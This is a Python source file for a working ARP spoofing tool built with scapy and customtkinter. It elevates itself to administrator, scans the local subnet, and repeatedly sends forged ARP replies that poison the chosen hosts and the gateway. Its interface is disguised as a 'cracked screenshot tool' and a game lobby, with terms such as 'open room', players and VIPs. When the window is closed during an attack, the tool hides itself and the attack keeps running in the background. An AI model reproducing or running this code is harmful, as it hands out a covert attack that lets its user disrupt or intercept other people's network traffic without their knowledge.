import sys
import threading
import time
from tkinter import messagebox

import customtkinter as ctk
# 注入 get_if_addr 和 conf 用于获取本机信息
from scapy.all import ARP, Ether, srp, sendp, conf, get_if_addr, get_if_list, get_if_hwaddr
import ctypes.wintypes
import subprocess
import socket
import re


ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

def run_as_admin():
    """如果当前用户不是管理员，则以管理员权限重新运行自身"""
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False

    if not is_admin:
        # 重新以管理员权限启动
        script = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        sys.exit(0)

class ProSpooferV3(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("截图工具2016pro破解版")
        self.geometry("550x500")

        self.is_running = False
        self.selected_targets = {}  # {ip: (checkbox_widget, var, mac)}
        self.gateway_mac = None
        self.local_ip = "127.0.0.1"

        # 先获取可用网卡列表
        self.available_ifaces = self._get_available_ifaces()
        # 自动选择最佳网卡
        best_name, best_ip, best_mac = self._auto_select_best_iface()
        self.current_iface = best_name
        self.local_ip = best_ip

        self.setup_ui()
        self.auto_detect_gateway()  # 自动填充网关
        # 添加这一行：拦截点击窗口右上角“X”的事件
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def _get_available_ifaces(self):
        """获取系统中所有可用网卡列表，并自动选择有网络连接的那个"""
        ifaces = []
        try:
            raw_list = get_if_list()
            for name in raw_list:
                try:
                    ip = get_if_addr(name)
                    mac = get_if_hwaddr(name)
                    if ip and ip != "0.0.0.0" and mac:
                        # 判断是否为回环地址
                        is_loopback = ip.startswith("127.")
                        ifaces.append((name, ip, mac, is_loopback))
                except:
                    pass
        except:
            pass

        # 如果没找到，至少把 conf.iface 放进去
        if not ifaces:
            try:
                name = str(conf.iface)
                ip = get_if_addr(conf.iface)
                mac = get_if_hwaddr(conf.iface)
                ifaces.append((name, ip, mac, ip.startswith("127.")))
            except:
                ifaces.append((str(conf.iface), "0.0.0.0", "00:00:00:00:00:00", False))
        return ifaces

    def _auto_select_best_iface(self):
        """自动选择最佳网卡（优先选有默认路由的、非回环的）"""
        best = None
        best_score = -1

        for name, ip, mac, is_loop in self.available_ifaces:
            score = 0
            if not is_loop:
                score += 10  # 非回环优先
            if ip and ip != "0.0.0.0" and not ip.startswith("169.254"):
                score += 5  # 有有效 IP
            # 检查是否有默认路由
            try:
                route = conf.route.route("0.0.0.0")
                if route and len(route) > 2:
                    route_iface = route[0]
                    if str(route_iface) == name:
                        score += 20  # 有默认路由的网卡优先级最高
            except:
                pass
            if score > best_score:
                best_score = score
                best = (name, ip, mac)

        if best:
            return best
        # 兜底：返回第一个非回环的
        for name, ip, mac, is_loop in self.available_ifaces:
            if not is_loop:
                return (name, ip, mac)
        # 实在不行返回第一个
        if self.available_ifaces:
            n, i, m, _ = self.available_ifaces[0]
            return (n, i, m)
        return (str(conf.iface), "0.0.0.0", "00:00:00:00:00:00")

    def _get_local_ip(self):
        """获取本机 IP，多种方法兜底"""
        # 方法1: 通过 scapy
        try:
            ip = get_if_addr(self.current_iface)
            if ip and ip != "0.0.0.0":
                return ip
        except:
            pass

        # 方法2: 通过 socket 连接外部
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            if ip and ip != "0.0.0.0":
                return ip
        except:
            pass

        # 方法3: 通过 scapy route
        try:
            gw = conf.route.route("0.0.0.0")
            if gw and len(gw) > 1:
                ip = gw[1]
                if ip and ip != "0.0.0.0":
                    return ip
        except:
            pass

        return "127.0.0.1"

    def repair_own_arp(self, gw_ip, gw_mac):
        """每轮攻击后修复本机 ARP 表，防止自身被污染"""
        # 将网关的真实 MAC 重新写入本机 ARP 缓存
        mac_formatted = gw_mac.replace(":", "-").upper()
        subprocess.run(
            ["arp", "-s", gw_ip, mac_formatted],
            capture_output=True
        )

    def auto_detect_gateway(self):
        """自动识别并填充默认网关"""
        try:
            # conf.route.route("0.0.0.0") 返回默认路由信息
            gw = conf.route.route("0.0.0.0")[2]
            if gw and gw != "0.0.0.0":
                self.gateway_entry.delete(0, "end")
                self.gateway_entry.insert(0, gw)
        except:
            pass

    def setup_ui(self):
        # 窗口大小调整为更合理的比例
        self.geometry("480x450")
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- 左侧控制面板 ---
        self.sidebar = ctk.CTkFrame(self, width=180, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew", padx=2, pady=2)

        ctk.CTkLabel(self.sidebar, text="⚙️ 房间设置", font=("Arial", 14, "bold")).pack(pady=(15, 10))

        # 显示本机 IP（自动识别，无需手动选择）
        self.iface_label = ctk.CTkLabel(self.sidebar, text=f"🚪 房间ID: {self.local_ip}",
                                        font=("Arial", 12, "bold"), text_color="#2ecc71")
        self.iface_label.pack(pady=(5, 2))

        input_padx = 12
        ctk.CTkLabel(self.sidebar, text="房主:", font=("Arial", 11)).pack(anchor="w", padx=input_padx)
        self.gateway_entry = ctk.CTkEntry(self.sidebar, height=24, font=("Arial", 11))
        # 默认值先设为空，由 auto_detect_gateway 填充
        self.gateway_entry.pack(fill="x", padx=input_padx, pady=(2, 8))

        ctk.CTkLabel(self.sidebar, text="vip用户:", font=("Arial", 11)).pack(anchor="w", padx=input_padx)
        self.whitelist_entry = ctk.CTkEntry(self.sidebar, placeholder_text=" 在这里输入vip账户", height=24,
                                            font=("Arial", 11))
        self.whitelist_entry.pack(fill="x", padx=input_padx, pady=(2, 8))

        self.bidirectional_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(self.sidebar, text="游客登陆", variable=self.bidirectional_var,
                        checkbox_width=16, checkbox_height=16, font=("Arial", 11)).pack(padx=input_padx, pady=5,
                                                                                        anchor="w")

        self.scan_btn = ctk.CTkButton(self.sidebar, text="🔍 寻找玩家", height=30, font=("Arial", 12, "bold"),
                                      command=self.start_scan)
        self.scan_btn.pack(fill="x", padx=input_padx, pady=10)

        # --- 这里的变量名改为 self.attack_btn ---
        self.attack_btn = ctk.CTkButton(self.sidebar, text="🚪 开启房间", height=30, font=("Arial", 12, "bold"),
                                        fg_color="#27ae60", hover_color="#219150", command=self.toggle_attack)
        self.attack_btn.pack(fill="x", padx=input_padx, pady=5)

        # --- 这里的变量名改为 self.tool_btn ---
        from ArpIP import openlock
        self.tool_btn = ctk.CTkButton(self.sidebar, text="✧原神uuid绑定", height=30, font=("Arial", 12, "bold"),
                                      fg_color="#27ae60", hover_color="#219150", command=openlock)
        self.tool_btn.pack(fill="x", padx=input_padx, pady=5)

        self.status_label = ctk.CTkLabel(self.sidebar, text="已准备好", font=("Arial", 10), text_color="gray")
        self.status_label.pack(side="bottom", pady=10)

        # --- 右侧列表面板 ---
        self.main_view = ctk.CTkFrame(self)
        self.main_view.grid(row=0, column=1, sticky="nsew", padx=5, pady=5)

        self.toolbar = ctk.CTkFrame(self.main_view, fg_color="transparent")
        self.toolbar.pack(fill="x", padx=5, pady=5)

        btn_style = {"width": 60, "height": 22, "font": ("Arial", 11), "fg_color": "#444"}
        ctk.CTkButton(self.toolbar, text="全部玩家", command=self.select_all, **btn_style).pack(side="left", padx=2)
        ctk.CTkButton(self.toolbar, text="其余玩家", command=self.invert_selection, **btn_style).pack(side="left", padx=2)
        ctk.CTkButton(self.toolbar, text="没有玩家", command=self.deselect_all, **btn_style).pack(side="left", padx=2)

        self.scroll_frame = ctk.CTkScrollableFrame(self.main_view, label_text="玩家列表 (双击复选框添加vip)",
                                                   label_font=("Arial", 11, "bold"))
        self.scroll_frame.pack(fill="both", expand=True, padx=2, pady=2)

    # --- 批量勾选逻辑 ---

    def select_all(self):
        for ip, (cb, var, mac) in self.selected_targets.items():
            if cb.cget("state") == "normal":
                var.set(True)

    def deselect_all(self):
        for ip, (cb, var, mac) in self.selected_targets.items():
            var.set(False)

    def invert_selection(self):
        for ip, (cb, var, mac) in self.selected_targets.items():
            if cb.cget("state") == "normal":
                var.set(not var.get())

    # --- 扫描逻辑 ---

    def start_scan(self):
        self.scan_btn.configure(state="disabled", text="查找中...")
        threading.Thread(target=self.do_scan, daemon=True).start()

    def add_to_whitelist_ui(self, ip):
        current = self.whitelist_entry.get().strip()
        if not current:
            self.whitelist_entry.insert(0, ip)
        elif ip not in [i.strip() for i in current.split(",")]:
            self.whitelist_entry.insert("end", f", {ip}")

        if ip in self.selected_targets:
            cb, var, mac = self.selected_targets[ip]
            var.set(False)
            cb.configure(state="disabled", text_color="#555555")
            del self.selected_targets[ip]

        if ip in self.all_widgets:
            cb, _ = self.all_widgets[ip]
            cb.unbind("<Double-Button-1>")
            cb.bind("<Double-Button-1>", lambda e, x=ip: self.remove_from_whitelist_ui(x))

        self.status_label.configure(text=f"玩家 {ip} 已充值vip", text_color="#e67e22")

    def remove_from_whitelist_ui(self, ip):
        current = [i.strip() for i in self.whitelist_entry.get().split(",") if i.strip()]
        if ip in current:
            current.remove(ip)
        self.whitelist_entry.delete(0, "end")
        self.whitelist_entry.insert(0, ", ".join(current))

        if ip in self.all_widgets:
            cb, _ = self.all_widgets[ip]
            var = ctk.BooleanVar(value=False)
            mac = cb.cget("text").split("|")[1].strip().split()[0].lower().replace("-", ":")
            cb.configure(state="normal", text_color="white", variable=var)
            cb.unbind("<Double-Button-1>")
            cb.bind("<Double-Button-1>", lambda e, x=ip: self.add_to_whitelist_ui(x))
            self.selected_targets[ip] = (cb, var, mac)

        self.status_label.configure(text=f"玩家 {ip} 已移出VIP", text_color="#e67e22")

    def do_scan(self):
        gw_ip = self.gateway_entry.get().strip()
        iface = self.current_iface

        # 如果网关为空，尝试用本机 IP 推断网段
        if not gw_ip or gw_ip == "0.0.0.0":
            if self.local_ip and self.local_ip != "127.0.0.1":
                network = ".".join(self.local_ip.split('.')[:-1]) + ".0/24"
                gw_ip = ".".join(self.local_ip.split('.')[:-1]) + ".1"
                self.gateway_entry.delete(0, "end")
                self.gateway_entry.insert(0, gw_ip)
            else:
                messagebox.showerror("扫描失败", "无法检测到网关 IP，请手动填写")
                self.scan_btn.configure(state="normal", text="🔍 寻找玩家")
                return
        else:
            network = ".".join(gw_ip.split('.')[:-1]) + ".0/24"

        # 获取当前输入的白名单
        wl_ips = [i.strip() for i in self.whitelist_entry.get().replace(" ", "").split(",") if i]
        wl_ips.append(gw_ip)
        wl_ips.append(self.local_ip)

        try:
            self.status_label.configure(text="正在扫描网关...", text_color="#f39c12")
            # 增加超时时间，手机热点可能响应慢
            ans_gw, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
                            timeout=3, iface=iface, verbose=False, retry=2)
            self.gateway_mac = ans_gw[0][1].hwsrc if ans_gw else None

            if self.gateway_mac:
                self.status_label.configure(text=f"网关已识别: {gw_ip} -> {self.gateway_mac}", text_color="#2ecc71")
            else:
                self.status_label.configure(text="网关未响应，尝试扫描网段...", text_color="#e67e22")

            # 清空旧列表
            for widget in self.scroll_frame.winfo_children():
                widget.destroy()
            self.selected_targets = {}
            self.all_widgets = {}

            # 扫描整个网段 - 增加超时和重试
            self.status_label.configure(text=f"正在扫描 {network} ...", text_color="#f39c12")
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
                         timeout=5, iface=iface, verbose=False, retry=3)

            # 如果没扫到任何设备，尝试用本机 IP 所在网段再扫一次（手机热点场景）
            if len(ans) == 0 and self.local_ip != "127.0.0.1":
                alt_network = ".".join(self.local_ip.split('.')[:-1]) + ".0/24"
                if alt_network != network:
                    self.status_label.configure(text=f"尝试备用网段 {alt_network} ...", text_color="#f39c12")
                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=alt_network),
                                 timeout=5, iface=iface, verbose=False, retry=3)

            # 处理扫描结果
            found_ips = set()
            for _, rcv in ans:
                ip, mac = rcv.psrc, rcv.hwsrc
                if ip in found_ips:
                    continue
                found_ips.add(ip)

                is_safe = ip in wl_ips or (self.gateway_mac and mac == self.gateway_mac) or ip == self.local_ip

                var = ctk.BooleanVar(value=False)
                state = "normal" if not is_safe else "disabled"

                if ip == self.local_ip:
                    t_color = "#e67e22"
                    display_text = f"{ip.ljust(15)} | {mac.upper()} (管理)"
                elif ip == gw_ip:
                    t_color = "#3498db"
                    display_text = f"{ip.ljust(15)} | {mac.upper()} (房主)"
                else:
                    t_color = "white" if not is_safe else "#555555"
                    display_text = f"{ip.ljust(15)} | {mac.upper()}"

                cb = ctk.CTkCheckBox(self.scroll_frame, text=display_text,
                                     variable=var, state=state, text_color=t_color)
                cb.pack(fill="x", pady=2)

                # 绑定双击事件：立即触发 add_to_whitelist_ui
                cb.unbind("<Double-Button-1>")
                cb.bind("<Double-Button-1>", lambda e, x=ip: self.add_to_whitelist_ui(x))
                if not is_safe:
                    self.all_widgets[ip] = (cb, var)

                if not is_safe:
                    self.selected_targets[ip] = (cb, var, mac)

            self.status_label.configure(text=f"扫描完毕: 发现 {len(found_ips)} 个玩家", text_color="#3498db")
        except Exception as e:
            messagebox.showerror("扫描失败", f"请检查 Npcap 是否正常运行: {e}")
        finally:
            self.scan_btn.configure(state="normal", text="🔍 寻找玩家")

    # --- 攻击逻辑 ---

    def toggle_attack(self):
        if not self.is_running:
            targets = [(ip, info[2]) for ip, info in self.selected_targets.items() if info[1].get()]
            if not targets:
                messagebox.showwarning("提示", "未勾选玩家")
                return

            self.is_running = True
            # 修改这里：使用 self.attack_btn
            self.attack_btn.configure(text="❎ 关闭房间", fg_color="#c0392b")
            threading.Thread(target=self.attack_loop, args=(targets,), daemon=True).start()
        else:
            self.is_running = False
            # 修改这里：使用 self.attack_btn
            self.attack_btn.configure(text="🚪 开启房间", fg_color="#27ae60")

    def attack_loop(self, targets):
        gw_ip = self.gateway_entry.get()
        iface = self.current_iface
        do_bi = self.bidirectional_var.get()
        count = 0

        while self.is_running:
            try:
                for target_ip, target_mac in targets:
                    p1 = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip)
                    sendp(p1, iface=iface, verbose=False)

                    if do_bi and self.gateway_mac:
                        p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=gw_ip, hwdst=self.gateway_mac, psrc=target_ip)
                        sendp(p2, iface=iface, verbose=False)

                    count += (2 if do_bi else 1)

                self.status_label.configure(text=f"房间已开启，累计掉落物: {count}", text_color="#2ecc71")
                self.repair_own_arp(gw_ip, self.gateway_mac)
                time.sleep(2)
            except Exception as e:
                print(f"房间中断: {e}")
                break

        self.status_label.configure(text="状态: 已暂停", text_color="gray")

    def on_closing(self):
        """处理窗口关闭事件"""
        if self.is_running:
            # 隐藏窗口，程序继续在后台运行
            self.withdraw()
            # 如果你想要在后台彻底停止，只能去任务管理器结束进程
        else:
            # 如果没在运行攻击，则直接销毁窗口并退出
            self.destroy()
            import sys
            sys.exit()

if __name__ == "__main__":
    run_as_admin()
    app = ProSpooferV3()
    app.mainloop()